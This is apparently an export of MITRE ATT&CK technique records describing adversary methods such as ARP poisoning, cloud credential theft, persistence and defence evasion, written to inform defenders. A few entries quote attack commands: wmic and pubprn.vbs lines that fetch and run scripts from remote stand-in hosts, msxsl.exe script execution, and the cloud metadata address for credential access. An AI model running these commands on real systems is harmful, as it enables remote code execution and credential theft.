The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.

An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.

The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)

Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)
","Linux, Windows, macOS",FALSE,FALSE,2020-10-15T12:05:58Z
attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae,2,T1556.009,Conditional Access Policies,"Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.

For example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. 

By modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.","IaaS, Identity Provider",FALSE,FALSE,2024-01-02T13:43:37Z
attack-pattern--cf1c2504-433f-4c4e-a1f8-91de45a0318c,2,T1578.002,Create Cloud Instance,"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)

Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",IaaS,FALSE,FALSE,2020-05-14T14:45:15Z
attack-pattern--cfb525cc-5494-401d-a82b-2539ca46a561,2,T1555.006,Cloud Secrets Management Stores,"Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  

Secrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  

If an adversary is able to gain sufficient privileges in a cloud environment – for example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets – they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation: Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)

**Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",IaaS,FALSE,FALSE,2023-09-25T12:41:26Z
attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7,2,T1651,Cloud Administration Command,"Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)

If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",IaaS,FALSE,FALSE,2023-03-13T15:26:11Z
attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120,2,T1595.001,Scanning IP Blocks,"Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.

Adversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",PRE,FALSE,FALSE,2020-10-02T16:54:23Z
attack-pattern--dfebc3b7-d19d-450b-81c7-6dafe4184c04,2,T1564.005,Hidden File System,"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)

Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)","Linux, macOS, Windows",FALSE,FALSE,2020-06-28T22:55:55Z
attack-pattern--eb125d40-0b2d-41ac-a71a-3229241c2cd3,2,T1037.001,Logon Script (Windows),"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)

Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",Windows,FALSE,FALSE,2020-01-10T03:43:37Z
attack-pattern--eb897572-8979-4242-a089-56f294f4c91d,2,T1665,Hide Infrastructure,"Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished by identifying and filtering traffic from defensive tools,(Citation: TA571) masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,(Citation: Schema-abuse)(Citation: Facad1ng)(Citation: Browser-updates) and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.

C2 networks may include the use of [Proxy](https://attack.mitre.org/techniques/T1090) or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.(Citation: sysdig)(Citation: Orange Residential Proxies)

Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.(Citation: mod_rewrite)(Citation: SocGholish-update) Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)).(Citation: TA571)(Citation: mod_rewrite)

Hiding C2 infrastructure may also be supported by [Resource Development](https://attack.mitre.org/tactics/TA0042) activities such as [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) and [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584). For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.(Citation: StarBlizzard)(Citation: QR-cofense)","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2024-02-13T17:00:00Z
attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3,2,T1220,XSL Script Processing,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>",Windows,FALSE,FALSE,2018-10-17T00:14:20Z
attack-pattern--ec4be82f-940c-4dcb-87fe-2bbdd17c692f,2,T1596.005,Scan Databases,"Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)

Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",PRE,FALSE,FALSE,2020-10-02T17:00:44Z
attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51,2,T1550.001,Application Access Token,"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.

Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) 

OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)

For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)

Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)

Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.","Containers, IaaS, Identity Provider, Office Suite, SaaS",FALSE,FALSE,2020-01-30T17:37:22Z
attack-pattern--f244b8dd-af6c-4391-a497-fc03627ce995,2,T1480.001,Environmental Keying,"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)

Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).

Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.

Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.","Linux, Windows, macOS",FALSE,FALSE,2020-06-23T22:28:28Z
attack-pattern--f4b843c1-7e92-4701-8fed-ce82f8be2636,2,T1588.005,Exploits,"Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)

In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)

An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.

Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Stealth](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",PRE,FALSE,FALSE,2020-10-01T02:17:46Z
attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b,2,T1211,Exploitation for Stealth,"Adversaries may exploit vulnerabilities to evade detection by hiding activity, suppressing logging, or operating within trusted or unmonitored components. 

Adversaries may exploit a system or application vulnerability to avoid detection while maintaining access within an environment. Exploitation occurs when an adversary leverages a programming flaw to execute code in a manner that minimizes visibility or blends in with legitimate activity. 

Rather than directly disabling defenses, adversaries may use exploitation to circumvent monitoring and logging mechanisms. This can include abusing vulnerabilities in logging pipelines, security tools, or cloud infrastructure to evade audit trails, suppress alerts, or operate without generating telemetry. 

Adversaries may identify these opportunities through prior reconnaissance or by performing discovery of security controls after initial access. In some cases, vulnerabilities in SaaS or public cloud environments may be exploited to evade logging, obscure activity, or deploy infrastructure that remains hidden from standard monitoring tools.(Citation: Bypassing CloudTrail in AWS Service Catalog)(Citation: GhostToken GCP flaw)","Linux, Windows, macOS, SaaS, IaaS",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--0470e792-32f8-46b0-a351-652bc35e9336,1,T1613,Container and Resource Discovery,"Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.

These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.",Containers,FALSE,FALSE,2021-03-31T14:26:00Z
attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f,1,T1592,Gather Victim Host Information,"Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).

Adversaries may also gather victim host information via User-Agent HTTP headers, which are sent to a server to identify the application, operating system, vendor, and/or version of the requesting user agent. This can be used to inform the adversary’s follow-on action. For example, adversaries may check user agents for the requesting operating system, then only serve malware for target operating systems while ignoring others.(Citation: TrellixQakbot)",PRE,FALSE,FALSE,2020-10-02T16:39:33Z
attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9,1,T1564.012,File/Path Exclusions,"Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)

Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1685)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.","Linux, macOS, Windows",FALSE,FALSE,2024-03-29T16:59:10Z
attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58,1,T1216.001,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",Windows,FALSE,FALSE,2020-02-03T16:49:57Z
attack-pattern--0a241b6c-7bb2-48f9-98f7-128145b4d27f,1,T1597.002,Purchase Technical Data,"Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.

Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",PRE,FALSE,FALSE,2020-10-02T17:05:43Z
attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65,1,T1129,Shared Modules,"Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).

Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.

The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)

The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft DLL)","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:40Z
attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3,1,T1546.013,PowerShell Profile,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.

[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) 

Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) 

An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",Windows,FALSE,FALSE,2020-01-24T15:11:02Z
attack-pattern--155207c0-7f53-4f13-a06b-0a9907ef5096,1,T1583.008,Malvertising,"Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. 

Adversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary’s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) 

Malvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising)

Adversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising)",PRE,FALSE,FALSE,2023-02-21T20:46:57Z
attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3,1,T1552.005,Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.

Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)

If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)

The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.
",IaaS,FALSE,FALSE,2020-02-11T18:47:46Z
